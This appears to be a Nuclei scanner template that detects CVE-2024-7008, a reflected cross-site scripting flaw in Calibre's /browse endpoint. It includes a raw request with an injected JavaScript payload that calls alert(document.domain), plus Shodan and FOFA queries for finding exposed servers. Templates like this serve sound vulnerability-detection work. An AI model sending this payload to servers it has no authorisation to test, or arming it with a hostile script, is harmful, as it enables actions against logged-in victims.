http:
- matchers:
  - part: header
    type: word
    words:
    - text/html
  - part: body
    type: word
    words:
    - window.location.href = "/#book_id=TEST";window.stop();alert(document.domain);//&panel=book_details
  - status:
    - 200
    type: status
  matchers-condition: and
  raw:
  - 'GET /browse/book/TEST&quot;;window.stop();alert(document.domain);%2f%2f HTTP/1.1

    Host: {{Hostname}}

    '
id: CVE-2024-7008
info:
  author: DhiyaneshDK
  classification:
    epss-percentile: 0.93508
    epss-score: 0.11942
  description: "It is possible to inject arbitrary JavaScript code into the /browse\
    \ endpoint of the Calibre content server, allowing an attacker to craft a URL\
    \ that when clicked by a victim, will execute the attacker\u2019s JavaScript code\
    \ in the context of the victim\u2019s browser. If the Calibre server is running\
    \ with authentication enabled and the victim is logged in at the time, this can\
    \ be used to cause the victim to perform actions on the Calibre server on behalf\
    \ of the attacker.\n"
  impact: 'Attackers can craft malicious URLs that execute arbitrary JavaScript in
    victims'' browsers, potentially performing unauthorized actions if authentication
    is enabled and the victim is logged in to the Calibre server.

    '
  metadata:
    fofa-query: 'Server: calibre'
    max-request: 1
    shodan-query: html:"Calibre"
    verified: true
  name: Calibre <= 7.15.0 - Reflected Cross-Site Scripting (XSS)
  reference:
  - https://starlabs.sg/advisories/24/24-7008/
  remediation: 'Update Calibre to a version later than 7.15.0 to address the reflected
    XSS vulnerability.

    '
  severity: medium
  tags: cve,cve2024,calibre,xss,vuln
